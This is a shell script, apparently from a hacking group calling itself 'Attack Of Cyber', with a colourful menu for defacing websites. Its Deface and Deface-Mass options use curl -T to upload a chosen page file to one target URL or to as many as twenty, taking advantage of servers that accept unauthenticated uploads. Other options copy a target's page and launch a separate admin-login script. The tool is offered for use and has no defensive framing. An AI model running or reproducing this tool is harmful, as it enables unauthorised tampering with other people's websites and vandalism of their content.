#usr/bin/sh
#ngapain liat-liat Tod :p
#cuman tools sederhana tod :p
green="\033[32;1m"
yellow="\033[33;1m"
indigo="\033[34;1m"
red="\033[35;1m"
purple="\033[37;1m"
cyan="\033[36;1m"
white="\033[39;1m"
echo $white"      NO!"$red"                          MNO!   "
echo $white"     MNO!!"$red"         [AMR]"$red"          MNNOO!    "
echo $white"   MMNO!"$red"                           MNNOO!! "
echo $white"  MNOONNOO!"$red"   MMMMMMMMMM"$white"PPPOII!"$red"   MNNO!!!!  "
echo $white" !O! NNO!"$red" MMMMMMMMMMMMM"$white"PPPOOOII!!"$red" NO!       "
echo $red"       ! MMMMMMMMMMMMM"$white"PPPPOOOOIII! !       "
echo $red"        MMMMMMMMMMMM"$white"PPPPPOOOOOOII!!       "
echo $red"        MMMMMOOOOOO"$white"PPPPPPPPOOOOMII!       "
echo $red"        MMMMM..    OPP"$white"MMP    .,OMI!       "
echo $red"        MMMM::"$purple"   o.,"$red"OP"$white"MP"$purple",.o"$white"   ::I!!"
echo $red"          NNM:::.,,OOPM!P"$white",.::::!!         "
echo $red"         MMNNNNNOOOOPMO"$white"!!IIPPO!!O!        "
echo $red"         MMMMMNNNNOO"$white":!!:!!IPPPPOO!        "
echo $red"          MMMMMNNOOMMNN"$white"IIIPPPOO!!         "
echo $red"             MMMONNMMNNN"$white"IIIOO!                "
echo $white"           MN"$red" MOMMMNNN"$white"IIIIIO!"$red" OO          "
echo $white"          MNO! "$red"iiiiii"$white"iiiiiI"$red" OOOO         "
echo $white"     NNN.MNO!   "$red"O"$yellow"!!!!!!!!!"$white"O"$red"   OONO NO!    "
echo $white"    MNNNNNO!    "$red"OOOOO"$white"OOOOOO"$red"    MMNNON!    "
echo $white"      MNNNNO!    "$red"PPP"$white"PPPPPP"$red"    MMNON!      "
echo $white"         OO!"$red"                   ON!        "
echo $yellow
figlet -f smshadow "AOC deface"
echo $indigo
date
echo $purple"___________________________________________________"
echo $cyan" ["$red"+"$cyan"]Author by	: AMRiezz "
echo $cyan" ["$red"+"$cyan"]Team        : Attack Of Cyber		"
echo $cyan" ["$red"+"$cyan"]Blog        : http://anrwiki.blogspot.com"
echo $cyan" ["$red"+"$cyan"]Github	: https://github.com/Amriez"
echo $cyan" ["$white"NOTE : simpan script di memory internal !!!!! "$cyan"]"
echo $purple"___________________________________________________"
echo $red"	~"$cyan"{"$white"A"$cyan"}"$white".Deface"$cyan"		{"$white"Q"$cyan"}"$white"Quit "
echo $red"	~"$cyan"{"$white"B"$cyan"}"$white".Takescript"$cyan"		{"$white"I"$cyan"}"$white"Info "
echo $red"	~"$cyan"{"$white"C"$cyan"}"$white".Exploit"$cyan
echo $red"	~"$cyan"{"$white"D"$cyan"}"$white".AdminLogin"$cyan
echo $purple"___________________________________________________"
echo $red"	~"$cyan"{"$white"T"$cyan"}"$white".TUTORIAL"$cyan
echo $purple"___________________________________________________"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  apaan

if [ $apaan = "A" ] || [ $apaan = "a" ]
then
echo $white"      NO!"$red"                          MNO!   "
echo $white"     MNO!!"$red"         [AMR]"$red"          MNNOO!    "
echo $white"   MMNO!"$red"                           MNNOO!! "
echo $white"  MNOONNOO!"$red"   MMMMMMMMMM"$white"PPPOII!"$red"   MNNO!!!!  "
echo $white" !O! NNO!"$red" MMMMMMMMMMMMM"$white"PPPOOOII!!"$red" NO!       "
echo $red"       ! MMMMMMMMMMMMM"$white"PPPPOOOOIII! !       "
echo $red"        MMMMMMMMMMMM"$white"PPPPPOOOOOOII!!       "
echo $red"        MMMMMOOOOOO"$white"PPPPPPPPOOOOMII!       "
echo $red"        MMMMM..    OPP"$white"MMP    .,OMI!       "
echo $red"        MMMM::"$purple"   o.,"$red"OP"$white"MP"$purple",.o"$white"   ::I!!       "
echo $red"          NNM:::.,,OOPM!P"$white",.::::!!         "
echo $red"         MMNNNNNOOOOPMO"$white"!!IIPPO!!O!        "
echo $red"         MMMMMNNNNOO"$white":!!:!!IPPPPOO!        "
echo $red"          MMMMMNNOOMMNN"$white"IIIPPPOO!!         "
echo $red"             MMMONNMMNNN"$white"IIIOO!                "
echo $white"           MN"$red" MOMMMNNN"$white"IIIIIO!"$red" OO          "
echo $white"          MNO! "$red"iiiiii"$white"iiiiiI"$red" OOOO         "
echo $white"     NNN.MNO!   "$red"O"$yellow"!!!!!!!!!"$white"O"$red"   OONO NO!    "
echo $white"    MNNNNNO!    "$red"OOOOO"$white"OOOOOO"$red"    MMNNON!    "
echo $white"      MNNNNO!    "$red"PPP"$white"PPPPPP"$red"    MMNON!      "
echo $white"         OO!"$red"                   ON!        "
echo "                                          "
figlet -f shadow Deface
echo $green "Masukan Target !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  target
echo $green "Masukan Script !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  script
curl -T /storage/emulated/0/$script $target
echo $red "[+]>>>>> = $target/$script "
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "B" ] || [ $apaan = "b" ]
then
echo $white"      NO!"$red"                          MNO!   "
echo $white"     MNO!!"$red"         [AMR]"$red"          MNNOO!    "
echo $white"   MMNO!"$red"                           MNNOO!! "
echo $white"  MNOONNOO!"$red"   MMMMMMMMMM"$white"PPPOII!"$red"   MNNO!!!!  "
echo $white" !O! NNO!"$red" MMMMMMMMMMMMM"$white"PPPOOOII!!"$red" NO!       "
echo $red"       ! MMMMMMMMMMMMM"$white"PPPPOOOOIII! !       "
echo $red"        MMMMMMMMMMMM"$white"PPPPPOOOOOOII!!       "
echo $red"        MMMMMOOOOOO"$white"PPPPPPPPOOOOMII!       "
echo $red"        MMMMM..    OPP"$white"MMP    .,OMI!       "
echo $red"        MMMM::"$purple"   o.,"$red"OP"$white"MP"$purple",.o"$white"   ::I!!       "
echo $red"          NNM:::.,,OOPM!P"$white",.::::!!         "
echo $red"         MMNNNNNOOOOPMO"$white"!!IIPPO!!O!        "
echo $red"         MMMMMNNNNOO"$white":!!:!!IPPPPOO!        "
echo $red"          MMMMMNNOOMMNN"$white"IIIPPPOO!!         "
echo $red"             MMMONNMMNNN"$white"IIIOO!                "
echo $white"           MN"$red" MOMMMNNN"$white"IIIIIO!"$red" OO          "
echo $white"          MNO! "$red"iiiiii"$white"iiiiiI"$red" OOOO         "
echo $white"     NNN.MNO!   "$red"O"$yellow"!!!!!!!!!"$white"O"$red"   OONO NO!    "
echo $white"    MNNNNNO!    "$red"OOOOO"$white"OOOOOO"$red"    MMNNON!    "
echo $white"      MNNNNO!    "$red"PPP"$white"PPPPPP"$red"    MMNON!      "
echo $white"         OO!"$red"                   ON!        "
echo $yellow
figlet -f shadow Nyolong
echo $green "Masukan Target !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ "  target
echo $green "Simpan dengan nama??(ex: script.html)"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " simpan
curl -o $simpan $target
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "C" ] || [ $apaan = "c" ]
then
echo $yellow
figlet -f smshadow "DEFACE-MASS"
figlet -f smshadow "EXPLOIT"
echo "### ctrl + c to quit ###"
echo "Masukan Script !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white                               
read -p " ╰─$ " script
echo "Masukan Target1 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target1
curl -T /storage/emulated/0/$script $target1
echo $cyan"["$green"+"$cyan"]"$red"$target1/$script"
echo "Masukan Target2 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target2
curl -T /storage/emulated/0/$script $target2
echo $cyan"["$green"+"$cyan"]"$red"$target2/$script"
echo "Masukan Target3 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target3
curl -T /storage/emulated/0/$script $target3
echo $cyan"["$green"+"$cyan"]"$red"$target3/$script"
echo "Masukan Target4 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target4
curl -T /storage/emulated/0/$script $target4
echo $cyan"["$green"+"$cyan"]"$red"$target4/$script"
echo "Masukan Target5 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target5
curl -T /storage/emulated/0/$script $target5
echo $cyan"["$green"+"$cyan"]"$red"$target5/$script"
echo "Masukan Target6 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target6
curl -T /storage/emulated/0/$script $target6
echo $cyan"["$green"+"$cyan"]"$red"$target6/$script"
echo "Masukan Target7 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target7
curl -T /storage/emulated/0/$script $target7
echo $cyan"["$green"+"$cyan"]"$red"$target7/$script"
echo "Masukan Target8 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target8
curl -T /storage/emulated/0/$script $target8
echo $cyan"["$green"+"$cyan"]"$red"$target8/$script"
echo "Masukan Target9 !!!!"
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target9
curl -T /storage/emulated/0/$script $target9
echo $cyan"["$green"+"$cyan"]"$red"$target9/$script"
echo "Masukan Target10 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target10
curl -T /storage/emulated/0/$script $target10
echo $cyan"["$green"+"$cyan"]"$red"$target10/$script"
echo "Masukan Target11 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target11
curl -T /storage/emulated/0/$script $target11
echo $cyan"["$green"+"$cyan"]"$red"$target11/$script"
echo "Masukan Target12 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target12
curl -T /storage/emulated/0/$script $target12
echo $cyan"["$green"+"$cyan"]"$red"$target12/$script"
echo "Masukan Target13 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target13
curl -T /storage/emulated/0/$script $target13
echo $cyan"["$green"+"$cyan"]"$red"$target13/$script"
echo "Masukan Target14 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target14
curl -T /storage/emulated/0/$script $target14
echo $cyan"["$green"+"$cyan"]"$red"$target14/$script"
echo "Masukan Target15 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target15
curl -T /storage/emulated/0/$script $target15
echo $cyan"["$green"+"$cyan"]"$red"$target15/$script"
echo "Masukan Target16 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target16
curl -T /storage/emulated/0/$script $target16
echo $cyan"["$green"+"$cyan"]"$red"$target16/$script"
echo "Masukan Target17 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target17
curl -T /storage/emulated/0/$script $target17
echo $cyan"["$green"+"$cyan"]"$red"$target17/$script"
echo "Masukan Target18 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target18
curl -T /storage/emulated/0/$script $target18
echo $cyan"["$green"+"$cyan"]"$red"$target18/$script"
echo "Masukan Target19 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target19
curl -T /storage/emulated/0/$script $target19
echo $cyan"["$green"+"$cyan"]"$red"$target19/$script"
echo "Masukan Target20 !!!! "
echo $white "╭─"$green"AMR@localhost"$cyan" ~/AOCsystem"$white
read -p " ╰─$ " target20
curl -T /storage/emulated/0/$script $target20
echo $cyan"["$green"+"$cyan"]"$red"$target20/$script"
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] : " back
fi

if [ $apaan = "D" ] || [ $apaan = "d" ]
then
python2 AMR.py
exit
fi

if [ $apaan = "I" ] || [ $apaan = "i" ]
then
echo $red"################# INFO ####################"
echo $indigo"__________________________________________"
echo $green"AUTHOR : AMRiezz			"
echo $purple"GITHUB : https://github.com/Amriez"
echo $white"BLOG : http://anrwiki.blogspot.com"
echo $yellow"		  THANKS TO : "
echo $cyan"[+] INDONESIAN SECURITY LITE "
echo $cyan"[+] BAD BUNNY CYBER TEAM "
echo $cyan"[+] RYUKI-KUN & MR.RSA & TEAM33MIRACLE & M3E.X "
echo $red"################# INFO ####################"
echo $indigo"__________________________________________"
echo $cyan"["$yellow"B"$cyan"]"$white"back "$cyan"["$yellow"Q"$cyan"]"$white"Quit"
read -p "[B/Q] " back
fi

if [ $apaan = "T" ] || [ $apaan = "t" ]
then
cat tutorial.txt
exit
fi

if [ $apaan = "Q" ] || [ $apaan = "q" ]
then
echo " :) "
exit
clear
fi


if [ $back = "B" ] || [ $back = "b" ]
then
sh AOC.sh
fi

if [ $back = "Q" ] || [ $back = "q" ]
then
clear
fi


#AMRsystem copyright
#author by AMRiezz
#Team AOC {Attack of cyber}

